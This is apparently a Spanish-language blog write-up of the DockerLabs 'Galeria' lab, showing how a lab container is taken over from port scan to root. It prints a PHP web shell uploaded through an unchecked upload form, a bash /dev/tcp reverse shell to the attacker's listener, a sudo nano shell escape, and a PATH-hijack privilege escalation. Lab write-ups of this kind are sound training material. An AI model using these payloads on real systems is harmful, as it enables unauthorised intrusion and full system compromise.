---
title: DockerLabs - Galeria
summary: "Write-up del laboratorio Galeria de DockerLabs"
author: elcybercurioso
date: 2025-11-11 21:20:54
categories: [Post, DockerLabs]
tags: [fácil, insecure file upload, sudo, library hijacking]
media_subpath: "/assets/img/posts/dockerlabs_galeria"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Galeria]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Galeria]
└─$ nmap -sCV -p80 172.17.0.2                                 
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Gallery
```

## análisis

Vemos en la página principal que hay múltiples imágenes disponibles:

![Desktop View](/20251110234455.webp){: width="972" height="589" .shadow}

En el código fuente vemos la ruta de donde provienen dichas imágenes:

![Desktop View](/20251110234549.webp){: width="972" height="589" .shadow}

Al ir a revisar la carpeta `/gallery/uploads`, vemos que nos permite listar su contenido:

![Desktop View](/20251110234604.webp){: width="600" height="370" .shadow}

Dentro, encontramos el script `handler.php`:

![Desktop View](/20251110234617.webp){: width="600" height="370" .shadow}

## acceso inicial (www-data)

Tras hacer algunas pruebas, nos damos cuenta de que no se está haciendo ninguna comprobación a la hora de subir ficheros, por lo que nos permite subir scripts de PHP como el siguiente, el cual podemos emplear para ejecutar comandos remotamente:

```php
<?php system($_GET['cmd']); ?>
```

![Desktop View](/20251110234821.webp){: width="600" height="370" .shadow}

En `/gallery/uploads/images` encontramos el script que acabamos de subir:

![Desktop View](/20251110234848.webp){: width="600" height="370" .shadow}

Probamos a acceder al script, y ejecutar comandos:

![Desktop View](/20251110234913.webp){: width="600" height="370" .shadow}

Dado que podemos ejecutar comandos, procedemos a obtener una consola remota con el siguiente comando:

```bash
http://172.17.0.2/gallery/uploads/images/shell.php?cmd=bash -c "bash -i >%26 /dev/tcp/172.17.0.1/4444 0>%261"
```

Debemos ponernos en escucha previamente con `nc` antes de ejecutar el comando anterior:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Galeria]
└─$ nc -nlvp 4444 
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 40960
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@a8753f861686:/var/www/html/gallery/uploads/images$ whoami
whoami
www-data
www-data@a8753f861686:/var/www/html/gallery/uploads/images$ hostname -I
hostname -I
172.17.0.2
```

Tratamos la TTY para obtener una consola completamente funcional:

```bash
www-data@a8753f861686:/var/www/html/gallery/uploads/images$ script -c bash /dev/null
<ml/gallery/uploads/images$ script -c bash /dev/null        
Script started, output log file is '/dev/null'.
www-data@a8753f861686:/var/www/html/gallery/uploads/images$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Galeria]
└─$ stty raw -echo;fg
[1]  + continued  nc -nlvp 4444
                               reset xterm
www-data@a8753f861686:/var/www/html/gallery/uploads/images$ export TERM=xterm
www-data@a8753f861686:/var/www/html/gallery/uploads/images$ export SHELL=bash
 210data@a8753f861686:/var/www/html/gallery/uploads/images$ stty rows 48 columns
```

## movimiento lateral (gallery)

Revisamos los permisos SUDO del usuario `www-data`, el cual puede ejecutar `/bin/nano` como el usuario `gallery`:

```bash
www-data@a8753f861686:/home$ sudo -l
Matching Defaults entries for www-data on a8753f861686:
    env_reset, mail_badpass, use_pty

User www-data may run the following commands on a8753f861686:
    (gallery) NOPASSWD: /bin/nano
    (www-data) NOPASSWD: /bin/nano
```

En [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo) nos indican que podemos llegar a invocar una consola como otro usuario realizando los siguientes pasos:

![Desktop View](/20251110235346.webp){: width="972" height="589" .shadow}

Los pasos son:
1. Ejecutar `sudo nano`.
2. Lanzar las combinaciones de teclas **Ctrl+R** y **Ctrl+X**
3. Escribir `reset; sh 1>&0 2>&0`
4. Pulsar **Enter**

```bash
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

De la siguiente manera:

![Desktop View](/20251110235538.webp){: width="600" height="370" .shadow}

Una vez hayamos realizado los pasos mencionados, deberíamos haber obtenido una consola como el usuario `gallery`:

```bash
gallery@a8753f861686:/home$ whoami
gallery
```

## escalada de privilegios (root)

Los permisos SUDO del usuario `gallery` nos indica que puede ejecutar el binario `/usr/local/bin/runme` como el usuario `root`:

```bash
gallery@a8753f861686:/home$ sudo -l
Matching Defaults entries for gallery on a8753f861686:
    env_reset, mail_badpass, env_keep+=PATH, use_pty

User gallery may run the following commands on a8753f861686:
    (ALL) NOPASSWD: /usr/local/bin/runme
```

Dado que no sabemos que hace este binario que nos indican, procedemos a revisarlo con herramientas como `strings`, el cual lista las cadenas legibles del binario que le indiquemos:

```bash
gallery@a8753f861686:/home$ strings /usr/local/bin/runme 
/lib64/ld-linux-x86-64.so.2
puts
system
__libc_start_main
__cxa_finalize
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
Converting image...
convert /var/www/html/gallery/uploads/images/input.png /var/www/html/gallery/uploads/images/output.jpg
Done.
```

Vemos que se está invocando al binario `convert`, pero dado que se está empleando la **ruta relativa** del mismo, y no la **ruta absoluta**, el binario `/usr/local/bin/runme` es vulnerable a un ataque de **Library Hijacking**.

Un **Library Hijacking** es una vulnerabilidad que permite que las llamadas que se hagan a binarios de forma relativa dentro de otros binarios sean secuestradas, haciendo que en vez de llamar a los binario legítimos, se llame a uno con el mismo nombre que nosotros definamos en la ruta actual, ya que podemos editar la variable de entorno PATH (que es la que se consulta para buscar un binario de forma relativa):

```bash
gallery@a8753f861686:/var/www/html/gallery/uploads/images$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
gallery@a8753f861686:/var/www/html/gallery/uploads/images$ export PATH=.:$PATH
gallery@a8753f861686:/var/www/html/gallery/uploads/images$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Una vez que la variable PATH ha sido modificada, creamos un script con el nombre `convert`, y le damos permisos de ejecución:

```bash
gallery@a8753f861686:~$ cat convert 
bash -p
gallery@a8753f861686:~$ chmod +x convert
```

Ahora, si volvemos a ejecutar el binario `/usr/local/bin/runme`, veremos que habremos invocado una consola como el usuario `root`:

```bash
gallery@a8753f861686:~$ sudo /usr/local/bin/runme
Converting image...
root@a8753f861686:/home/gallery# whoami
root
```

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>